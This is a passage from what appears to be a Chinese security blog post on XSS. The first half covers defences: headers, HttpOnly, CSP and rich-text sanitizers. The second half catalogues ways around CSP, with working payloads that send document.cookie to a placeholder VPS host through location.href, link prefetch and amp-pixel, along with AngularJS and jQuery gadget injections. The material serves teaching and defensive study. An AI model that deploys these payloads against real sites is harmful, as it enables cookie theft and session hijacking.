</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>通过设置X-Content-Type-Options头的值为&#34;nosniff&#34;，可以防止浏览器将响应内容以错误的方式解析，减少了XSS攻击的风险。
</span></span></code></pre></td></tr></table></div></div></li><li><p>X-Frame-Options</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>通过设置X-Frame-Options头，可以阻止通过嵌入iframe或frame的方式进行点击劫持攻击。可以设置该头的值为&#34;DENY&#34;，&#34;SAMEORIGIN&#34;或&#34;ALLOW-FROM &lt;域名&gt;&#34;。
</span></span></code></pre></td></tr></table></div></div></li><li><p>Content Security Policy（CSP）（meta标签等）</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>通过设置CSP头，可以限制资源加载的来源，以防止执行不受信任的脚本。CSP可以指定允许的域名、允许的脚本类型以及其他安全策略。
</span></span></code></pre></td></tr></table></div></div></li></ul><h4 id=httponly>HttpOnly<a hidden class=anchor aria-hidden=true href=#httponly>#</a></h4><p>当一个 cookie 设置了 HttpOnly 标志后，浏览器会禁止通过 JavaScript 脚本来读取这个 cookie 的值。这意味着即使有 XSS 攻击成功注入了恶意脚本，也无法从受害者浏览器中获取敏感的 cookie 值，从而有效防止了 cookie 盗取和会话劫持攻击。</p><p>但是HttpOnly不能够完全防御XSS，只能减少XSS带来的危害。</p><h4 id=csp同源策略>CSP同源策略<a hidden class=anchor aria-hidden=true href=#csp同源策略>#</a></h4><p>除了在内容上使用 XSSFilter 进行过滤，还可以使用 HttpOnly、CSP 头部进一步预防 XSS 攻击。</p><p>CSP (Content Security Policy) 是用来防御 XSS 的安全策略。CSP 通过白名单控制，仅允许加载指定的资源。这些资源包括 JavaScript, CSS, HTML, Frames, fonts, image, embeddable object, Java applets, ActiveX, audio 和 video 等。</p><p>有两种方法可以启用 CSP :</p><ul><li>设置 HTTP 头信息的 <code>Content-Security-Policy</code> 字段</li><li>在网页添加 <code>&lt;meta></code> 标签</li></ul><p>配置示例：</p><p>只允许同源下的资源</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl>Content-Security-Policy: default-src &#39;self&#39;;
</span></span></code></pre></td></tr></table></div></div><p>允许同源以及指定地址的 JS 资源</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl>Content-Security-Policy: script-src &#39;self&#39; www.google-analytics.com ajax.googleapis.com;
</span></span></code></pre></td></tr></table></div></div><p>多个资源时，后面的会覆盖前面的</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl>Content-Security-Policy: default-src &#39;none&#39;; script-src &#39;self&#39;; connect-src &#39;self&#39;; img-src &#39;self&#39;;
</span></span></code></pre></td></tr></table></div></div><h4 id=富文本情景下对xss的防护>富文本情景下对XSS的防护<a hidden class=anchor aria-hidden=true href=#富文本情景下对xss的防护>#</a></h4><p>富文本环境下，传统的html编码转移与特殊字符过滤是不大可行的。富文本的情况和我们平常遇到的一些 XSS 案例不一样，不是简单的在输出位置做针对性过滤就行的，因为既然提供富文本编辑器，那么肯定是内容需要支持某些标签输入输出，如果 XSS FILTER 直接干掉了标签，会影响到内容的展示，所以有必要对富文本情况拎出来单独处理。</p><p>有人说用黑名单处理，过滤掉那些危险的标签，那么你会掉进一个有无限 case 要处理的坑里，暂且不说能把现有的危险标签罗列完整，H5 出来后新增的那些标签特性简直就是噩梦。另外，就算考虑再周到，也要知道这个世界上还有一款浏览器叫做 IE，奇葩的解析方式简直让人防不胜防，完全不按套路出牌。</p><p>既然黑名单不适合，那么自然就想到白名单的方式，这是目前来说比较好的防御富文本 XSS 方式。具体工作分以下几个方面：</p><ul><li>确定白名单</li><li>解析 DOM 树，非白名单直接丢弃</li></ul><p>白名单过滤器编写较为麻烦且考虑难免不周到，为了安全性与因此多使用业界成熟的过滤器。</p><p><img loading=lazy src=/postPic/image-20240520173040558.png alt=加载失败></p><h5 id=服务端过滤html解析器>服务端过滤（html解析器）<a hidden class=anchor aria-hidden=true href=#服务端过滤html解析器>#</a></h5><p><strong>jsoup</strong></p><p>jsoup 是一款 Java 的 HTML 解析器，可直接解析某个 URL 地址、HTML 文本内容。它提供了一套非常省力的 API，可通过 DOM、CSS 以及类似于 JQuery 的操作方法来取出和操作数据。基于MIT协议发布，可放心用于商业项目。</p><p>jsoup内置了一些白名单的标签属性list，同时支持用户自定义，或者在此基础上根据需求灵活扩展。</p><p><strong>OWASP Java HTML Sanitizer</strong></p><p>OWASP Java HTML Sanitizer 是OWASP（Open Web Application Security Project，开放Web应用程序安全项目）组织开源的一款HTML过滤器，为安全而生，使用起来非常灵活。</p><p><strong>其他服务端开发语言过滤组件</strong></p><p>.NET：https://github.com/mganss/HtmlSanitizer
Golang：https://github.com/microcosm-cc/bluemonday
PHP：http://htmlpurifier.org/
Python：https://pypi.python.org/pypi/bleach
Django框架（Python）：https://github.com/shaowenchen/django-xss-cleaner</p><h5 id=前端过滤>前端过滤<a hidden class=anchor aria-hidden=true href=#前端过滤>#</a></h5><p><strong>js-xss</strong></p><p>前端将数据渲染到页面呈现之前，也可以对内容进行一次过滤。这里推荐使用js-xss模块。除了可以在页面里直接引入js使用，同时也支持node.js，当使用node.js做服务端时，也可以参照前面的方案，在数据传入时使用该模块进行过滤。</p><p>源码：https://github.com/leizongmin/js-xss
项目主页： <a href=http://jsxss.com/>http://jsxss.com</a></p><h4 id=标签属性安全使用建议>标签属性安全使用建议<a hidden class=anchor aria-hidden=true href=#标签属性安全使用建议>#</a></h4><p><strong>1、href、src属性需要校验协议</strong>
如果未校验，攻击者可以使用javascript:伪协议插入执行恶意的js代码。</p><p><strong>2、什么情况a标签要加rel=”nofollow”属性？</strong></p><p>这个属性的意思是告诉搜索引擎不要追踪此链接。如果A网页上有一个链接指向B网页，但A网页给这个链接加上了rel=”nofollow” 标注，那么搜索引擎不会把A网页计算入B网页的反向链接。搜索引擎看到这个属性就会取消链接的投票权重。</p><p>简单来讲，有些搞SEO的人，会在各大网站插入很多带有超链接的垃圾信息，如果强制加了rel=“nofollow”属性，搜索引擎爬到了，也不会给对方增加权重。这样搞恶意SEO的人，就没兴趣在你的网站里插垃圾信息了。</p><p>所以要不要加这个属性，取决于你的业务是否需要防止上述情形。</p><p><strong>3、哪些属性被认为是安全的？</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>align, alink, alt, bgcolor, border, cellpadding, cellspacing, class, color, cols, colspan, coords, dir, face, height, hspace, ismap, lang, marginheight, marginwidth, multiple, nohref, noresize, noshade, nowrap, ref, rel, rev, rows, rowspan, scrolling, shape, span, summary, tabindex, title, usemap, valign, value, vlink, vspace, width.
</span></span></code></pre></td></tr></table></div></div><p>以上是OWASP整理的安全属性，可以放心使用。参考：
<a href=https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html>https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html</a></p><p><strong>4、iframe标签安全使用建议</strong></p><p>建议不要使用，如果一定要用，可以通过下面几个方式降低风险：</p><ul><li>src属性必须校验协议，限制http和https，同时进行url白名单正则校验，限制内容为可信域名，防止攻击者插入恶意页面。</li><li>固定长宽，或限制最大长宽，防止子页面覆盖父页面。</li><li>使用沙箱（sandbox）机制，遵循权限最小化原则配置相应选项满足业务需求。</li></ul><p>sandbox 详细可参考
iframe特性全解读： <a href=https://zhuanlan.zhihu.com/p/88809313>https://zhuanlan.zhihu.com/p/88809313</a>
sandbox 属性：https://www.bookstack.cn/read/html-tutorial/spilt.2.docs-iframe.md</p><p><strong>5、style属性，建议不要使用。</strong></p><p>原因参考：基于css注入的向量https://html5sec.org/#css
如果需要支持用户控制样式，建议使用class属性，针对不同的值提前定好对应的样式。</p><p>实在非要使用style属性的话，那就自己把属性值提取出来，解析后再做一层白名单过滤吧（如果写不好，会存在绕过的可能）。</p><p><strong>6、script标签严禁用户插入，这个相信不用解释了。</strong></p><h4 id=其他常见场景对应问题和解决方案>其他常见场景、对应问题和解决方案<a hidden class=anchor aria-hidden=true href=#其他常见场景对应问题和解决方案>#</a></h4><h5 id=1富文本内容被wafweb应用防火墙拦截>1、富文本内容被WAF（Web应用防火墙）拦截<a hidden class=anchor aria-hidden=true href=#1富文本内容被wafweb应用防火墙拦截>#</a></h5><p>有些公司的WAF规则比较严格，对请求中包含某些标签内容的，会直接判定为攻击，进行拦截。</p><p>通常WAF是站在企业整体安全的角度去做防护的，不能因为业务的某一个功能点，去降低整体的防护能力。这时，可以考虑使用以下方案去满足业务需求：</p><p><img loading=lazy src=/postPic/image-20240520174551817.png alt=加载失败></p><p>图中蓝色线条是在原有常规方案基础上的改动。即在前端解析富文本内容的DOM树，转换为json格式，之后提交给服务端，服务端进行白名单过滤。</p><p>html和json的转换，可以考虑使用类似html2json功能的组件来实现：
<a href=https://github.com/Jxck/html2json>https://github.com/Jxck/html2json</a></p><p>注意，这种方案绕过了WAF的防护，请务必保证白名单策略的安全！请务必保证白名单策略的安全！请务必保证白名单策略的安全！</p><h5 id=2内容来自文件导入>2、内容来自文件导入<a hidden class=anchor aria-hidden=true href=#2内容来自文件导入>#</a></h5><p>有的业务场景，需要从文件批量导入内容，并且内容还要支持富文本，流程如下：</p><p><img loading=lazy src=/postPic/image-20240520174701743.png alt=加载失败></p><p>这种场景下，可以在服务端提取到内容后对富文本内容进行白名单过滤，之后再进行持久化存储。对于业务上不需要支持富文本的字段，直接按照传统XSS的防护方案进行特殊字符转义就好。</p><h3 id=csp的绕过>CSP的绕过<a hidden class=anchor aria-hidden=true href=#csp的绕过>#</a></h3><h4 id=参考文章>参考文章<a hidden class=anchor aria-hidden=true href=#参考文章>#</a></h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>https://xz.aliyun.com/t/5084?time__1311=n4%2BxnD07iti%3DFq7q7KDsA3xCqobFDBGD9QEhYD&amp;alichlgref=https%3A%2F%2Fxz.aliyun.com%2Ft%2F12890%3Ftime__1311%3Dmqmhq%252BxjhiGKDsD7GY0%253DdnDWw1Y5C9eD%26alichlgref%3Dhttps%253A%252F%252Fwww.google.com.hk%252F#toc-0
</span></span></code></pre></td></tr></table></div></div><p>CSP的绕过从CSP的诞生开始就一直被前端的安全研究人员所热衷，本文总结一些我了解到的CSP的绕过方式，若有不足，敬请批评补充</p><h4 id=locationhref>location.href<a hidden class=anchor aria-hidden=true href=#locationhref>#</a></h4><p>CSP不影响location.href跳转，因为当今大部分网站的跳转功能都是由前端实现的，CSP如果限制跳转会影响很多的网站功能。所以，用跳转来绕过CSP获取数据是一个万能的办法，虽然比较容易被发现，但是在大部分情况下对于我们已经够用
当我们已经能够执行JS脚本的时候，但是由于CSP的设置，我们的cookie无法带外传输，就可以采用此方法，将cookie打到我们的vps上</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=nx>location</span><span class=p>.</span><span class=nx>href</span> <span class=o>=</span> <span class=s2>&#34;vps_ip:xxxx?&#34;</span><span class=o>+</span><span class=nb>document</span><span class=p>.</span><span class=nx>cookie</span>
</span></span></code></pre></td></tr></table></div></div><p>有人跟我说可以跳过去再跳回来，但是这样不是会死循环一直跳来跳去吗2333333
利用条件:</p><ol><li>可以执行任意JS脚本，但是由于CSP无法数据带外</li></ol><h4 id=link标签导致的绕过>link标签导致的绕过<a hidden class=anchor aria-hidden=true href=#link标签导致的绕过>#</a></h4><p>这个方法其实比较老，去年我在我机器上试的时候还行，现在就不行了
因为这个标签当时还没有被CSP约束，当然现在浏览器大部分都约束了此标签，但是老浏览器应该还是可行的。
所以我们可以通过此标签将数据带外</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=c>&lt;!--</span> <span class=nx>firefox</span> <span class=o>--&gt;</span>
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=nx>link</span> <span class=nx>rel</span><span class=o>=</span><span class=s2>&#34;dns-prefetch&#34;</span> <span class=nx>href</span><span class=o>=</span><span class=s2>&#34;//${cookie}.vps_ip&#34;</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c>&lt;!--</span> <span class=nx>chrome</span> <span class=o>--&gt;</span>
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=nx>link</span> <span class=nx>rel</span><span class=o>=</span><span class=s2>&#34;prefetch&#34;</span> <span class=nx>href</span><span class=o>=</span><span class=s2>&#34;//vps_ip?${cookie}&#34;</span><span class=o>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>当然这个是我们写死的标签，如何把数据带外？</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kd>var</span> <span class=nx>link</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s2>&#34;link&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>link</span><span class=p>.</span><span class=nx>setAttribute</span><span class=p>(</span><span class=s2>&#34;rel&#34;</span><span class=p>,</span> <span class=s2>&#34;prefetch&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>link</span><span class=p>.</span><span class=nx>setAttribute</span><span class=p>(</span><span class=s2>&#34;href&#34;</span><span class=p>,</span> <span class=s2>&#34;//vps_ip/?&#34;</span> <span class=o>+</span> <span class=nb>document</span><span class=p>.</span><span class=nx>cookie</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nb>document</span><span class=p>.</span><span class=nx>head</span><span class=p>.</span><span class=nx>appendChild</span><span class=p>(</span><span class=nx>link</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>这样就可以把cookie带外了
利用条件:</p><ol><li>可以执行任意JS脚本，但是由于CSP无法数据带外</li></ol><h4 id=使用iframe绕过>使用Iframe绕过<a hidden class=anchor aria-hidden=true href=#使用iframe绕过>#</a></h4><p>当一个同源站点，同时存在两个页面，其中一个有CSP保护的A页面，另一个没有CSP保护B页面，那么如果B页面存在XSS漏洞，我们可以直接在B页面新建iframe用javascript直接操作A页面的dom，可以说A页面的CSP防护完全失效
A页面:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=c>&lt;!--</span> <span class=nx>A页面</span> <span class=o>--&gt;</span>
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=nx>meta</span> <span class=nx>http</span><span class=o>-</span><span class=nx>equiv</span><span class=o>=</span><span class=s2>&#34;Content-Security-Policy&#34;</span> <span class=nx>content</span><span class=o>=</span><span class=s2>&#34;default-src &#39;self&#39;; script-src &#39;self&#39;&#34;</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=nx>h1</span> <span class=nx>id</span><span class=o>=</span><span class=s2>&#34;flag&#34;</span><span class=o>&gt;</span><span class=nx>flag</span><span class=p>{</span><span class=mh>0xffff</span><span class=p>}</span><span class=o>&lt;</span><span class=err>/h1&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>B页面:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=c>&lt;!--</span> <span class=nx>B页面</span> <span class=o>--&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c>&lt;!--</span> <span class=nx>下面模拟XSS</span> <span class=o>--&gt;</span>
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=nx>body</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=nx>script</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl><span class=kd>var</span> <span class=nx>iframe</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s1>&#39;iframe&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>iframe</span><span class=p>.</span><span class=nx>src</span><span class=o>=</span><span class=s2>&#34;A页面&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>document</span><span class=p>.</span><span class=nx>body</span><span class=p>.</span><span class=nx>appendChild</span><span class=p>(</span><span class=nx>iframe</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>setTimeout</span><span class=p>(()=&gt;</span><span class=nx>alert</span><span class=p>(</span><span class=nx>iframe</span><span class=p>.</span><span class=nx>contentWindow</span><span class=p>.</span><span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s1>&#39;flag&#39;</span><span class=p>).</span><span class=nx>innerHTML</span><span class=p>),</span><span class=mi>1000</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=err>/script&gt;</span>
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=err>/body&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>setTimeout是为了等待iframe加载完成
利用条件:</p><ol><li>一个同源站点内存在两个页面，一个页面存在CSP保护，另一个页面没有CSP保护且存在XSS漏洞</li><li>我们需要的数据在存在CSP保护的页面</li></ol><h4 id=用cdn来绕过>用CDN来绕过<a hidden class=anchor aria-hidden=true href=#用cdn来绕过>#</a></h4><p>一般来说，前端会用到许多的前端框架和库，部分企业为了减轻服务器压力或者其他原因，可能会引用其他CDN上的JS框架，如果CDN上存在一些低版本的框架，就可能存在绕过CSP的风险
这里给出orange师傅绕hackmd CSP的文章<a href=https://paper.seebug.org/855/>Hackmd XSS</a>
案例中hackmd中CSP引用了cloudflare.com CDN服务，于是orange师傅采用了低版本的angular js模板注入来绕过CSP，如下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=o>&lt;</span><span class=nx>meta</span> <span class=nx>http</span><span class=o>-</span><span class=nx>equiv</span><span class=o>=</span><span class=s2>&#34;Content-Security-Policy&#34;</span> <span class=nx>content</span><span class=o>=</span><span class=s2>&#34;default-src &#39;self&#39;; script-src &#39;unsafe-eval&#39; https://cdnjs.cloudflare.com;&#34;</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl><span class=c>&lt;!--</span> <span class=nx>foo</span><span class=o>=</span><span class=err>&#34;</span><span class=o>--&gt;</span>
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=nx>script</span> <span class=nx>src</span><span class=o>=</span><span class=nx>https</span><span class=o>:</span><span class=c1>//cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.min.js&gt;
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>&lt;</span><span class=err>/script&gt;</span>
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=nx>div</span> <span class=nx>ng</span><span class=o>-</span><span class=nx>app</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>{{</span><span class=nx>constructor</span><span class=p>.</span><span class=nx>constructor</span><span class=p>(</span><span class=s1>&#39;alert(document.cookie)&#39;</span><span class=p>)()}}</span>
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=err>/div&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>这个是存在低版本angular js的cdn服务商列表
<a href=https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/angular.js#L26-L76>https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/angular.js#L26-L76</a>
除了低版本angular js的模板注入，还有许多库可以绕过CSP
下面引用https://www.jianshu.com/p/f1de775bc43e
如果用了Jquery-mobile库，且CSP中包含"script-src &lsquo;unsafe-eval&rsquo;&ldquo;或者"script-src &lsquo;strict-dynamic&rsquo;"，可以用此exp</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=o>&lt;</span><span class=nx>div</span> <span class=nx>data</span><span class=o>-</span><span class=nx>role</span><span class=o>=</span><span class=nx>popup</span> <span class=nx>id</span><span class=o>=</span><span class=s1>&#39;&lt;script&gt;alert(1)&lt;/script&gt;&#39;</span><span class=o>&gt;&lt;</span><span class=err>/div&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>还比如RCTF2018题目出现的AMP库,下面的标签可以获取名字为FLAG的cookie</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=o>&lt;</span><span class=nx>amp</span><span class=o>-</span><span class=nx>pixel</span> <span class=nx>src</span><span class=o>=</span><span class=s2>&#34;http://your domain/?cid=CLIENT_ID(FLAG)&#34;</span><span class=o>&gt;&lt;</span><span class=err>/amp-pixel&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>blackhat2017有篇ppt总结了可以被用来绕过CSP的一些JS库
<a href=https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf>https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf</a>
利用条件:</p><ol><li>CDN服务商存在某些低版本的js库</li><li>此CDN服务商在CSP白名单中</li></ol><h4 id=站点可控静态资源绕过>站点可控静态资源绕过<a hidden class=anchor aria-hidden=true href=#站点可控静态资源绕过>#</a></h4><p>给一个绕过codimd的(实例)<a href=https://github.com/k1tten/writeups/blob/master/bugbounty_writeup/HackMD_XSS_%26_Bypass_CSP.md>codimd xss</a>
案例中codimd的CSP中使用了<code>www.google-analytics.com</code>
而www.google.analytics.com中提供了自定义javascript的功能（google会封装自定义的js，所以还需要unsafe-eval），于是可以绕过CSP</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=o>&lt;</span><span class=nx>meta</span> <span class=nx>http</span><span class=o>-</span><span class=nx>equiv</span><span class=o>=</span><span class=s2>&#34;Content-Security-Policy&#34;</span> <span class=nx>content</span><span class=o>=</span><span class=s2>&#34;default-src &#39;self&#39;; script-src &#39;unsafe-eval&#39; https://www.google-analytics.com&#34;</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=nx>script</span> <span class=nx>src</span><span class=o>=</span><span class=s2>&#34;https://www.google-analytics.com/gtm/js?id=GTM-PJF5W64&#34;</span><span class=o>&gt;&lt;</span><span class=err>/script&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>同理，若其他站点下提供了可控静态资源的功能，且CSP中允许了此站点，则可以采用此方式绕过
利用条件:</p><ol><li>站点存在可控静态资源</li><li>站点在CSP白名单中</li></ol><h4 id=站点可控jsonp绕过>站点可控JSONP绕过<a hidden class=anchor aria-hidden=true href=#站点可控jsonp绕过>#</a></h4><p>JSONP的详细介绍可以看看我之前的一篇文章https://xz.aliyun.com/t/4470
大部分站点的jsonp是完全可控的，只不过有些站点会让jsonp不返回html类型防止直接的反射型XSS，但是如果将url插入到script标签中，除非设置x-content-type-options头，否者尽管返回类型不一致，浏览器依旧会当成js进行解析
以ins&rsquo;hack 2019/的bypasses-everywhere这道题为例，题目中的csp设置了www.google.com</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>参考文献
</span></span><span class=line><span class=cl>xss 向量大全
</span></span><span class=line><span class=cl>https://html5sec.org/
</span></span></code></pre></td></tr></table></div></div></div><footer class=post-footer><ul class=post-tags><li><a href=http://3lizabeth.fun/tags/web%E5%AE%89%E5%85%A8/>Web安全</a></li><li><a href=http://3lizabeth.fun/tags/xss/>Xss</a></li><li><a href=http://3lizabeth.fun/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/>基础漏洞</a></li><li><a href=http://3lizabeth.fun/tags/top10/>Top10</a></li></ul><nav class=paginav><a class=prev href=http://3lizabeth.fun/posts/study/server_basic_build/><span class=title>« 上一页</span><br><span>clash-for-Linux的简单配置与docker安装</span>
</a><a class=next href=http://3lizabeth.fun/posts/study/xxe_basic/><span class=title>下一页 »</span><br><span>XXE漏洞基础</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2025 <a href=http://3lizabeth.fun/>3lizabeth's Blog</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span><div class=busuanzi-footer><span id=busuanzi_container_site_pv>本站总访问量<span id=busuanzi_value_site_pv></span>次
</span><span id=busuanzi_container_site_uv>本站访客数<span id=busuanzi_value_site_uv></span>人次</span></div></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="复制";function s(){t.innerHTML="已复制！",setTimeout(()=>{t.innerHTML="复制"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const 